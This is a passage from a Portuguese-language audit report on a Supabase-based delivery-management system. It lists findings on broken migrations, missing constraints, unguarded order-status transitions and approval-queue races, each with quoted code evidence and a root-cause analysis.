- **Impacto no negócio:** A lista de países bloqueados é um controle de segurança, e o repositório não registra quem pode lê-la ou alterá-la — ninguém consegue auditar isso pelo código. Além disso, não dá para montar uma cópia limpa do banco para testar: o processo para no meio, então toda mudança precisa ser testada direto na produção.
- **Evidência:**
  ```
  supabase/migrations/20260108144121_4432fc97-f0cf-4dab-95d5-4e66ed486768.sql:218-222 — `DROP POLICY IF EXISTS "Authenticated users can manage geo blocks" ON public.geo_blocks;` / `CREATE POLICY "Admins can insert geo blocks" ON public.geo_blocks` / `FOR INSERT TO authenticated` / `WITH CHECK (public.has_role(auth.uid(), 'admin'));` — sem nenhum `CREATE TABLE ... geo_blocks` em supabase/migrations (0 ocorrências). Uso no front confirmado em src/pages/GeoBlockingPage.tsx:96-98 — `.from("geo_blocks")` / `.select("*")` / `.eq("is_blocked", false)`.
  ```
- **Causa raiz:** A tabela foi criada fora do versionamento (sync Lovable / painel). As 191 migrations só a referenciam: policies de INSERT/UPDATE/DELETE em 20260108144121:218-231, índice em 20260711185011:9, constraint em 20260711194822:4-6, drop de índice em 20260813143344:8 e COMMENT em 20261121100000:28. Consequências: (a) o repo não descreve o controle de acesso de uma tabela que é controle de segurança (bloqueio geográfico) — não há ENABLE RLS nem policy de SELECT versionada, então a única fonte é o banco; (b) `DROP POLICY IF EXISTS` protege contra policy ausente, não contra tabela ausente, então num banco novo a migration 20260108144121 aborta com 42P01 e `supabase db reset` nunca termina — exatamente o fluxo de teste que o AGENTS.md manda usar.
- **Arquivos:** `supabase/migrations/20260108144121_4432fc97-f0cf-4dab-95d5-4e66ed486768.sql`, `supabase/migrations/20260711185011_e422dc54-64d2-4379-8882-138f7bf9abb4.sql`, `supabase/migrations/20260711194822_91c059f1-9073-4dc7-b576-0dcf7c85f854.sql`, `supabase/migrations/20261121100000_add_table_comments.sql`, `src/pages/GeoBlockingPage.tsx`, `docs/pendencias/P-08-geo-blocks-sem-rls.md`
- **Etapas do plano:** 041

#### M-017 — Auditoria de MFA nunca grava: log_mfa_session() insere na coluna aal_level, que não existe, e omite duas colunas NOT NULL

- **Camada:** Banco — integridade e índices
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A trilha de auditoria de verificação em duas etapas está vazia: não há como provar quando e de onde um administrador passou pelo MFA. Além disso o aviso de segurança 'Nova Sessão MFA' que o sistema promete ao usuário nunca dispara, porque depende de um INSERT nessa tabela.
- **Evidência:**
  ```
  supabase/migrations/20260516112923_4931320e-6f67-4667-8eae-490bb7d9564c.sql:51-57 — `CREATE OR REPLACE FUNCTION public.log_mfa_session()\nRETURNS TRIGGER AS $$\nBEGIN\n  INSERT INTO public.mfa_sessions (user_id, aal_level, ip_address, user_agent)` ; supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql:85-91 — `CREATE TABLE public.mfa_sessions (... factor_id TEXT NOT NULL, verified BOOLEAN DEFAULT false, ... expires_at TIMESTAMP WITH TIME ZONE NOT NULL,`
  ```
- **Causa raiz:** Duas migrations criam `mfa_sessions` com contratos diferentes. A segunda usa `CREATE TABLE IF NOT EXISTS`, então em produção (onde a primeira já rodou) a definição nova foi descartada, mas a função `log_mfa_session()` — escrita para o shape novo — foi criada de qualquer jeito. Qualquer execução dela falha com 42703 (column "aal_level" does not exist); mesmo sem isso falharia com 23502, porque não informa `factor_id` nem `expires_at`, ambos NOT NULL sem default. A função segue viva em produção (é alvo de GRANT/REVOKE em 20260516112942:2-10, 20260711184027:37, 20260712203139:24) e nenhum CREATE TRIGGER a aciona.
- **Arquivos:** `supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql`, `supabase/migrations/20260516112923_4931320e-6f67-4667-8eae-490bb7d9564c.sql`, `src/hooks/useSecurityPushNotifications.ts`, `src/integrations/supabase/types.ts`
- **Etapas do plano:** 096

#### M-018 — Schema local divergente do de produção: CREATE TABLE IF NOT EXISTS antigo vence e as migrations de restauração viram no-op

- **Camada:** Banco — integridade e índices
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Teste e produção têm bancos diferentes: uma correção validada no ambiente de teste pode quebrar em produção e vice-versa, sem ninguém entender por quê. No caso específico do log de atualização de cache, o ambiente de teste trava no segundo ciclo de atualização — o que faz parecer que o cache está quebrado quando não está.
- **Evidência:**
  ```
  supabase/migrations/20250102000002_cache_system_complete.sql:70-82; supabase/migrations/20261123150000_cache_refresh_log_restaurado.sql:16 e :28-29; supabase/migrations/20251226000002_create_audit_log.sql:4; supabase/migrations/20261121192500_restore_audit_log.sql:15-17; supabase/migrations/20261122120200_job_queue_system.sql:43-56 (padrão correto). NÃO procede: 20251226020000_create_materialized_views_cache.sql:13 já faz `DROP MATERIALIZED VIEW IF EXISTS driver_stats_cache CASCADE` antes do create da :15.
  ```
- **Causa raiz:** O padrão adotado para "restaurar" tabelas que o ledger marcou como aplicadas sem terem rodado (explicado em 20261122120200_job_queue_system.sql:4-8) é `CREATE TABLE IF NOT EXISTS` com a definição nova. Isso resolve produção, onde a tabela não existe, mas num banco construído do zero a definição antiga é criada primeiro e a nova é ignorada por completo — colunas, constraints e índices ficam diferentes. Só uma das migrations de restauração fez a normalização correta: 20261122120200_job_queue_system.sql:43-56 acrescenta `ADD COLUMN IF NOT EXISTS` e refaz os CHECKs com `DROP CONSTRAINT IF EXISTS` + `ADD CONSTRAINT`. As de audit_log, cache_refresh_log e mfa_sessions não fizeram.
- **Arquivos:** `supabase/migrations/20250102000002_cache_system_complete.sql`, `supabase/migrations/20261123150000_cache_refresh_log_restaurado.sql`, `supabase/migrations/20251226000002_create_audit_log.sql`, `supabase/migrations/20261121192500_restore_audit_log.sql`, `supabase/migrations/20251226020000_create_materialized_views_cache.sql`, `supabase/migrations/20261122090000_cache_system_backend.sql`, `supabase/migrations/20261122120200_job_queue_system.sql`
- **Etapas do plano:** 097
- **Divergência entre revisores:** um revisor refutou e outro confirmou: CONFIRMA: Confirmado no essencial, com uma evidência errada. Confirmo cache_refresh_log: 20250102000002_cache_system_complete.sql:70-82 cria a tabela com `CONSTRAINT unique_running_refresh UNIQUE (view_name, status) DEFERRABLE INITIALLY DEFERRED` (no máximo uma linha por par view/status, logo o 2º 'success' d || REFUTA: RASTREADO. O mecanismo descrito exige que um banco construído do zero chegue às migrations de restauração, e isso é inalcançável: `supabase/migrations/20250102000002_cache_system_complete.sql` é a 3ª migration na ordem (`ls supabase/migrations | sort` → 20241231000000_saved_filters, 20250102000001_s

#### M-019 — Valor de enum DRIVER_ASSIGNED pode não existir em produção, derrubando o alerta de motorista designado

- **Camada:** Banco — integridade e índices
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se o valor não tiver sido aplicado, toda vez que a Lalamove designa um motorista o aviso ao responsável pela coleta falha em silêncio — a pessoa não é avisada de que o motorista está a caminho.
- **Evidência:**
  ```
  supabase/migrations/20261122130200_alert_type_driver_assigned.sql:4; src/integrations/supabase/types.ts:4749-4764 (15 valores, sem DRIVER_ASSIGNED); supabase/functions/lalamove-webhook/index.ts:461 + helper em :345-354 (falha de insert só é logada); contra-indício em supabase/migrations/20261122160000_fix_supplier_notify_disabled.sql:31, que também exigiria o valor para rodar.
  ```
- **Causa raiz:** ADD VALUE precisa de arquivo e transação próprios, então essa migration ficou isolada e depende de ser disparada à mão pelo workflow de aplicação. O snapshot de tipos, gerado depois da geo_foundation, não a contém — indício de que ela pode ter ficado para trás. Se o valor não existir, o INSERT em alerts falha com 22P02 e o aviso de coleta ao responsável não sai.
- **Arquivos:** `supabase/migrations/20261122130200_alert_type_driver_assigned.sql`, `supabase/functions/lalamove-webhook/index.ts`, `supabase/migrations/20261122160000_fix_supplier_notify_disabled.sql`, `src/integrations/supabase/types.ts`
- **Etapas do plano:** 098
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Sem MCP apontando para o banco oficial iecgydonctmabiijadsf (AGENTS.md: os três MCPs Supabase da sessão são de outros projetos), não dá para consultar pg_enum nem o ledger supabase_migrations.schema_migrations. O snapshot types.ts é de 2026-11-21 23:25, anterior a essa migration, então a ausência pode ser só defasagem do arquivo — não prova que o valor falta no banco.

#### M-020 — tracking_events perdeu chave primária e as duas chaves estrangeiras ao ser reparticionada

- **Camada:** Banco — integridade e índices
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O histórico de GPS pode apontar para pedidos e motoristas que não existem, sem o banco reclamar: um erro de código grava a trilha num pedido errado e o mapa simplesmente mostra o trajeto vazio, sem erro em lugar nenhum. E se um pedido for apagado, as posições dele ficam no banco para sempre (antes eram apagadas em cascata) — dado pessoal de localização sem dono.
- **Evidência:**
  ```
  supabase/migrations/20260516114956_ae65dc31-f603-4f09-87a8-f7ff56459e41.sql:2-15 — `DROP TABLE IF EXISTS public.tracking_events;\n\nCREATE TABLE public.tracking_events (\n    id UUID NOT NULL DEFAULT gen_random_uuid(),\n    order_id UUID,\n    driver_id UUID,` ; mesmo arquivo:27-28 só recria `CREATE INDEX idx_tracking_order_created ON public.tracking_events (order_id, created_at);`
  ```
- **Causa raiz:** A reparticionagem de 2026-05-16 refez a tabela do zero e não recopiou PK nem FKs; nenhuma das 19 migrations posteriores que tocam `tracking_events` as devolveu (grep por `REFERENCES`/`PRIMARY KEY` em supabase/migrations/*.sql filtrado por tracking_events não retorna nada depois dessa data). As únicas constraints recuperadas foram CHECKs de faixa de coordenada, em 20260712110254_d65d9750-b900-4c03-98c2-c95ad186f7a1.sql:2-6.
- **Arquivos:** `supabase/migrations/20260516114956_ae65dc31-f603-4f09-87a8-f7ff56459e41.sql`, `supabase/migrations/20260513180659_3d0cc70a-4422-478c-825d-2da43ac7eb15.sql`, `src/integrations/supabase/types.ts`
- **Etapas do plano:** 099

#### M-116 — A cadeia de migrations não aplica do zero: quatro colisões abortam `supabase db reset` / recriação do banco

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Não é possível recriar o banco a partir do repositório: um ambiente novo, um teste local ou uma recuperação de desastre param no meio da aplicação das migrations. Hoje a única cópia funcional do banco é a produção.
- **Evidência:**
  ```
  Colisões reais: 20250102000002_cache_system_complete.sql:157 vs 20251226000004_create_cache_views.sql:290-293; 20250102000002_cache_system_complete.sql:257-262 vs 20261122090000_cache_system_backend.sql:118-123; 20251226000003_create_job_queue.sql:254-257 vs 20251226010001_configure_pg_cron.sql:12-17. Falsa: 20251226020000_create_materialized_views_cache.sql:13 (`DROP MATERIALIZED VIEW IF EXISTS driver_stats_cache CASCADE;`) precede o CREATE de :15.
  ```
- **Causa raiz:** `CREATE OR REPLACE FUNCTION` não aceita mudar nome de parâmetro nem tipo/colunas de retorno (42P13) e `CREATE MATERIALIZED VIEW` sem IF NOT EXISTS falha se a relação existe (42P07). O repo acumulou duas gerações de cache e três de job_queue sem nunca dropar a geração anterior, porque em produção nada disso chegou a ser aplicado (drift Lovable) — então o erro só aparece quando a cadeia roda de verdade, do zero.
- **Arquivos:** `supabase/migrations/20250102000002_cache_system_complete.sql`, `supabase/migrations/20251226000004_create_cache_views.sql`, `supabase/migrations/20251226020000_create_materialized_views_cache.sql`, `supabase/migrations/20251226000003_create_job_queue.sql`, `supabase/migrations/20251226010001_configure_pg_cron.sql`, `supabase/migrations/20261122090000_cache_system_backend.sql`, `docs/MIGRATION_RECONCILIATION_2026-11.md`, `docs/agentes/banco.md`
- **Etapas do plano:** 240

#### M-117 — Trigger de geofence lê OLD em INSERT: o primeiro ponto do rastreio pode abortar o upsert e o rastreio nunca começa

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quando o motorista já está no local de coleta no primeiro ping de GPS, a abertura do rastreio falha; o webhook apenas registra o erro no log (`if (trackingError) logger.error(...)`, lalamove-webhook/index.ts:631) e o pedido fica sem rastreio no mapa e sem nenhum alerta de geofence, em silêncio.
- **Evidência:**
  ```
  O trigger cobre INSERT e UPDATE: supabase/migrations/20261122130100_geo_foundation.sql:530-533 → `CREATE TRIGGER trg_active_tracking_geo BEFORE INSERT OR UPDATE OF current_latitude, current_longitude, eta_minutes, next_stop_index ON public.active_tracking FOR EACH ROW EXECUTE FUNCTION public.geo_evaluate_tracking();`. No corpo vigente, OLD é lido sem guarda de TG_OP: supabase/migrations/20261122131000_geo_eta_delay.sql:106 → `NEW.near_stop_cycles := CASE WHEN v_dist <= v_arrived_m THEN COALESCE(OLD.near_stop_cycles, 0) + 1 ELSE 0 END;` (as outras leituras de OLD, nas linhas 64-66, estão protegidas por `IF TG_OP = 'UPDATE' AND ...`). O caminho de INSERT existe e é o que inicia o rastreio: supabase/functions/lalamove-webhook/index.ts:617-630 → `.from('active_tracking').upsert({ order_id: orderUuid, driver_id: ..., current_latitude: locationData.latitude, ... }, { onConflict: 'order_id' })`, e o default do status passa direto pelo filtro do trigger: supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql:33 → `ADD COLUMN IF NOT EXISTS tracking_status TEXT DEFAULT 'ACTIVE',`.
  ```
- **Causa raiz:** Em trigger de linha disparado por INSERT o registro OLD não é atribuído; ler um campo dele levanta 55000 (`record "old" is not assigned yet`). Como o CASE só avalia o ramo THEN, o erro ocorre no INSERT em que a primeira posição recebida já está dentro de `arrived_radius_m` da próxima parada — situação comum, porque o primeiro DRIVER_LOCATION_UPDATED costuma chegar com o motorista já no ponto de coleta.
- **Arquivos:** `supabase/migrations/20261122131000_geo_eta_delay.sql`, `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 241

#### M-135 — A cadeia de migrations não roda do zero: três arquivos referenciam objetos que não existem ou que são criados depois

- **Camada:** Banco — integridade e índices
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Não existe banco de teste descartável. O caminho que a própria documentação manda usar antes de qualquer mexida em banco (docs/agentes/banco.md:12: 'Postgres descartável — supabase start + supabase db reset') para de funcionar no segundo arquivo da fila. Resultado prático: toda mudança de banco só pode ser testada direto na produção, que é exatamente o que a regra proíbe.
- **Evidência:**
  ```
  supabase/migrations/20250102000002_cache_system_complete.sql:9-23 — `CREATE MATERIALIZED VIEW IF NOT EXISTS mv_driver_stats AS\nSELECT ... FROM drivers d\nLEFT JOIN orders o ON d.id = o.driver_id\nWHERE d.deleted_at IS NULL` ; supabase/migrations/20261121201800_indices_alert_id_created_by.sql:9-10 — `CREATE INDEX IF NOT EXISTS idx_order_geo_events_alert_id\n  ON public.order_geo_events (alert_id);`
  ```
- **Causa raiz:** Migrations de uma modelagem antiga (tabela `orders`, soft delete, `driver_approvals`) nunca foram removidas nem corrigidas quando o schema real virou `lalamove_orders`/`driver_approval_queue`. Em produção isso não apareceu porque as migrations são aplicadas uma a uma, por lista explícita, pelo workflow .github/workflows/apply-migrations.yml:13 — nunca a cadeia inteira. O próprio repo já sabe do problema: supabase/migrations/20261122090000_cache_system_backend.sql:8-10 diz textualmente que "as versoes originais referenciavam colunas que nao existem no schema real (orders, delivery_value, completed_at, rating...)" — mas criou um arquivo novo e deixou os antigos na pasta. O caso de 20261121201800 é igual: 20261123170000_indices_fk_faltantes.sql:1-4 refez os mesmos dois índices porque o arquivo anterior nunca entrou no ledger, e também deixou o original lá, com data anterior à criação da tabela que ele indexa.
- **Arquivos:** `supabase/migrations/20250102000002_cache_system_complete.sql`, `supabase/migrations/20251226000004_create_cache_views.sql`, `supabase/migrations/20261121201800_indices_alert_id_created_by.sql`, `docs/agentes/banco.md`, `supabase/migrations/20261122090000_cache_system_backend.sql`, `supabase/migrations/20261123170000_indices_fk_faltantes.sql`
- **Etapas do plano:** 271


## Causa raiz: Decisão sobre pedido e motorista é gravada direto, sem olhar o estado atual, sem confirmar e sem volta

Todos os pontos que mudam o estado de um pedido ou a situação de um motorista foram escritos como gravação simples: ninguém pergunta em que estado a coisa está antes de mudar. Por isso um evento desconhecido reabre pedido já concluído, uma importação em massa rebaixa pedidos que já andaram, dois gestores decidem o mesmo caso e o segundo apaga o primeiro, um segundo comprovante de entrega apaga a foto já guardada e cada troca de motorista cria um novo pedido de aprovação. Na mesma linha, as duas ações mais definitivas da tela — bloquear e liberar um motorista em definitivo — executam no primeiro clique, sem pergunta e sem desfazer, enquanto aprovar e rejeitar têm desfazer.

**9 achado(s) sob esta causa.**


#### C-009 — Importação em massa da UAPI rebaixa o status de pedidos existentes e sobrescreve endereço e cliente com valores de espaço reservado

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Rodar a importação da UAPI com pedidos em andamento faz entregas voltarem a estados anteriores e apaga o endereço de coleta, o endereço de entrega e o nome do cliente de pedidos que já estavam corretos no sistema.
- **Evidência:**
  ```
  supabase/functions/lalamove-uapi/index.ts:427-443 (statusMap de 4 estados + `|| 'PENDING'` + literais 'N/A'/'Importado UAPI'), :457-464 (correção só com addr_info), :466-470 (upsert sem checagem + totalImported++). Gate: supabase/config.toml:38-39.
  ```
- **Causa raiz:** O upsert por lalamove_id não distingue 'importar pedido novo' de 'atualizar pedido existente': ele reescreve todas as colunas do objeto. O mapa numérico da UAPI só tem 4 estados e cai em 'PENDING' por padrão, então um pedido local em PICKED_UP ou DELIVERING é rebaixado para ON_GOING/PENDING. Os campos de endereço e cliente só são corrigidos se `order.addr_info` vier preenchido (linhas 457-464); quando não vem, os literais 'N/A' e 'Importado UAPI' são gravados por cima do dado real. E o retorno do upsert não é checado.
- **Arquivos:** `supabase/functions/lalamove-uapi/index.ts`
- **Etapas do plano:** 013

#### C-016 — Nenhuma guarda de transição na única função que muda status do pedido: evento desconhecido vira 'ON_GOING' e ressuscita pedido já concluído

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um aviso atrasado ou fora de ordem da Lalamove faz um pedido já entregue, cancelado ou rejeitado voltar a aparecer como 'em trânsito'. Isso suja o painel, reabre alertas, dispara nova notificação ao cliente e corrompe o indicador de entregas concluídas.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:318-326 (UPDATE sem comparação nem condição), :529-531 (fallback `|| 'ON_GOING'`), :108-117 (mapa sem 'DELIVERING'); ausência de guarda no banco confirmada em 20251224143803:310, 20251224183135:40, 20261123200000:132
  ```
- **Causa raiz:** `updateOrderStatus` lê o status atual só para registrar `old_status` no histórico — não há comparação, nem bloqueio de estado terminal, nem verificação de ordem. Soma-se o fallback `|| 'ON_GOING'`: qualquer status que a Lalamove mande e não esteja no mapa de 8 chaves (index.ts:108-117), incluindo 'DELIVERING', vira 'ON_GOING'. Não existe CHECK nem trigger no banco que impeça a regressão (os únicos triggers em lalamove_orders são updated_at, sync Bitrix24 e trg_close_tracking_on_order_end).
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 060

#### A-054 — DRIVER_ASSIGNED força status 'MATCHED' sem guarda e sem registrar nada no histórico

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A atribuição e a troca de motorista não aparecem na linha do tempo do pedido — ninguém consegue auditar quando e por que o motorista mudou. E um aviso atrasado da Lalamove pode fazer um pedido já concluído voltar a 'Motorista atribuído'.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:445-449:
              const orderPatch: Record<string, unknown> = { driver_id: driverId, status: 'MATCHED' };
              if (normalizedDriverPhone) orderPatch.driver_phone = normalizedDriverPhone;
              const { data: orderData } = await supabase
                .from('lalamove_orders')
                .update(orderPatch)
  ```
- **Causa raiz:** Os casos DRIVER_ASSIGNED e DRIVER_CHANGED (index.ts:376-377) escrevem o status direto na tabela, sem passar pelo helper updateOrderStatus (index.ts:318) — logo sem verificação de estado terminal, sem comparação de ordem e sem a linha correspondente em lalamove_status_history. Um DRIVER_ASSIGNED que chegue depois de ORDER_COMPLETED (entrega fora de ordem, que a própria Lalamove admite) rebaixa o pedido concluído para 'MATCHED'.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 093

#### A-055 — Fila de aprovação aceita decisão em cima de decisão: dois gestores simultâneos, e o desfazer devolve motorista bloqueado para 'aguardando aprovação'

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um motorista que foi bloqueado por risco pode voltar silenciosamente para a fila como 'aguardando aprovação' e ser aprovado em seguida. E a decisão de um gestor pode ser sobrescrita pela de outro sem ninguém perceber.
- **Evidência:**
  ```
  src/hooks/useApprovalActions.ts:34-39, :46-47, :56-61, :68-69, :78-85, :93-100 (nenhum filtro de estado atual). Ausência de guarda no banco: supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:389 (FOR ALL USING(true)) e 20260712112936_1938d693-e6f9-4169-9f1e-30624531ab57.sql:2-3 (só CHECK de risk_score/priority). Bloqueio concorrente: supabase/functions/evaluate-driver/index.ts:750-756. Hook em uso: src/pages/ApprovalsPage.tsx:26, src/pages/DashboardRedesigned.tsx:59.
  ```
- **Causa raiz:** Nenhum dos quatro fluxos (aprovar, rejeitar, whitelist, blacklist) filtra pelo estado atual: falta `.eq('status', 'PENDING')` no UPDATE da fila e qualquer verificação do status atual do motorista. Com isso: (1) dois gestores decidindo a mesma linha ao mesmo tempo acabam com a decisão do segundo prevalecendo, sem erro nem aviso; (2) o desfazer grava 'PENDING_APPROVAL' no motorista mesmo que ele tenha sido colocado em BLACKLIST ou bloqueado automaticamente pelo evaluate-driver (supabase/functions/evaluate-driver/index.ts:753-756) nesse meio-tempo; (3) as duas escritas não são atômicas — se a segunda falhar, a fila fica 'APROVADO' com o motorista ainda pendente.
- **Arquivos:** `src/hooks/useApprovalActions.ts`, `src/hooks/useApprovalActionsEnhanced.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 094

#### M-049 — Evento de POD repetido ou fora de ordem apaga a foto e a data de entrega já gravadas

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A foto que comprova a entrega pode sumir do pedido depois de já ter sido recebida, deixando a entrega sem comprovante e disparando o alerta de prova de entrega faltante numa entrega que de fato foi comprovada.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:680-686: `const updates: Record<string, unknown> = { pod_status: normalizedPod, pod_image_url: imageUrl ?? null, pod_delivered_at: deliveredIso, }; let q = supabase.from('lalamove_stops').update(updates).eq('order_id', orderUuid);` | index.ts:703: `pod_image_url: imageUrl ?? null,` (mesmo problema no upsert de lalamove_stop_proofs)
  ```
- **Causa raiz:** O UPDATE grava sempre as três colunas, usando `?? null` quando o campo não vem no evento. Um segundo POD_STATUS_CHANGED da mesma parada sem imagem (ou com status diferente de DELIVERED) zera pod_image_url e pod_delivered_at que o evento anterior tinha preenchido. O mesmo vale para o upsert em lalamove_stop_proofs (linhas 699-706), que é feito por stop_id e sobrescreve o registro inteiro. A proteção de entrega duplicada do webhook (índice único de idempotency_key, supabase/migrations/20260723172904_...sql:2) é calculada sobre o conteúdo exato do corpo e não cobre dois eventos distintos sobre a mesma parada.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 128

#### M-052 — Troca de motorista duplica pedidos de aprovação: a fila não tem unicidade por pedido e a edge não checa se já existe um pendente

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** A fila de aprovações mostra o mesmo motorista e o mesmo pedido várias vezes, os contadores de pendências e de tempo de espera ficam inflados, e um gestor pode aprovar uma cópia enquanto outra continua pendente.
- **Evidência:**
  ```
  supabase/functions/evaluate-driver/index.ts:770-779: `await supabase.from('driver_approval_queue').insert({ driver_id: driverId, driver_name: evaluatedDriver.name, order_id: orderId, ... status: 'PENDING',` | supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:173-184 (só `id UUID ... PRIMARY KEY` e FKs) | supabase/functions/job-worker/index.ts:116-122: `await supabase.functions.invoke('evaluate-driver', { body: { driverId: payload.driverId, orderId: payload.orderId,` (segundo caminho de reavaliação)
  ```
- **Causa raiz:** Cada DRIVER_ASSIGNED ou DRIVER_CHANGED chama evaluate-driver (lalamove-webhook/index.ts:478-485), que insere uma nova linha PENDING sempre que o risco exigir aprovação manual. Sem índice único em (driver_id, order_id) e sem consulta prévia, uma troca de motorista, uma reentrega do mesmo evento com corpo ligeiramente diferente ou uma reavaliação geram linhas pendentes repetidas para o mesmo par motorista/pedido.
- **Arquivos:** `supabase/functions/evaluate-driver/index.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 131

#### M-094 — Blacklist e Whitelist de motorista executam no primeiro clique, sem confirmação e sem desfazer

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um clique errado bloqueia um motorista para sempre (ou o marca como confiável para sempre, pulando a análise de risco em todos os pedidos futuros), sem perguntar nada e sem caminho de volta pela interface.
- **Evidência:**
  ```
  src/pages/approvals/ApprovalCard.tsx:110-111 (onClick direto, sem diálogo); src/pages/ApprovalsPage.tsx:112 (handlers passados direto); src/hooks/useApprovalActions.ts:76-106 (sem showUndoToast; sobrescreve risk_score/risk_level) vs :45 e :67 (approve/reject com undo).
  ```
- **Causa raiz:** Aprovar e rejeitar recebem desfazer (`showUndoToast` em useApprovalActions.ts:45 e :68), mas as duas ações permanentes — blacklist e whitelist — não têm diálogo de confirmação nem undo, embora sejam as de maior consequência e fiquem lado a lado, com rótulo abreviado ('BL'/'WL') no celular.
- **Arquivos:** `src/pages/approvals/ApprovalCard.tsx`, `src/hooks/useApprovalActions.ts`
- **Etapas do plano:** 189

#### M-095 — Decisão de aprovação de motorista não checa o status atual: duas abas sobrescrevem uma à outra

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Dois gerentes trabalhando na mesma fila: o segundo clique vence e pode reverter uma aprovação para rejeição (bloqueando o motorista) sem nenhum aviso de que o caso já tinha sido resolvido.
- **Evidência:**
  ```
  src/hooks/useApprovalActions.ts:34-40, :56-62, :78-84 (updates incondicionais, sem checagem de linhas afetadas); src/hooks/usePendingApprovals.ts:136 (refetchInterval: 15000); ausência de trigger/policy de guarda nas migrations de driver_approval_queue (última: supabase/migrations/20261122150100_fix_public_rls_bypass.sql:44-47)
  ```
- **Causa raiz:** O update é incondicional. Quem estiver com a tela aberta em outra aba (ou dentro da janela de 15s) ainda vê o cartão e pode decidir de novo, sobrescrevendo a decisão já registrada, inclusive invertendo aprovado para rejeitado — e o motorista é atualizado junto (`drivers.status`).
- **Arquivos:** `src/hooks/useApprovalActions.ts`, `src/pages/ApprovalsPage.tsx`
- **Etapas do plano:** 190

#### B-046 — 'Bloquear motorista' executa direto no primeiro clique, sem confirmacao

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um clique errado tira um motorista da frota da empresa inteira, nao so daquele pedido. Desfazer exige achar o motorista na aba 'Bloqueados' de outra tela.
- **Evidência:**
  ```
  src/components/orders/OrderDetailModal.tsx:350-359 (botao 'Bloquear motorista', `onClick={() => handleFleetAction('block')}` na linha 355, rotulo na 358) | :126-137 `await fleetMutation.mutateAsync({ driverFid: order.driverId, action });` | comparativo :312 `if (confirm('Confirmar solicitação de troca de motorista?')) {` | reversibilidade: src/components/lalamove/UapiFleetPanel.tsx:28
  ```
- **Causa raiz:** A acao mais duradoura das duas (bloquear o motorista para todos os pedidos futuros da conta corporativa) e a unica sem passo de confirmacao, e esta lado a lado com 'Favoritar motorista', num par de botoes pequenos de mesmo estilo.
- **Arquivos:** `src/components/orders/OrderDetailModal.tsx`
- **Etapas do plano:** 266


## Causa raiz: Controle de acesso existe só na tela, em três listas paralelas, e decide até quando não sabe a resposta

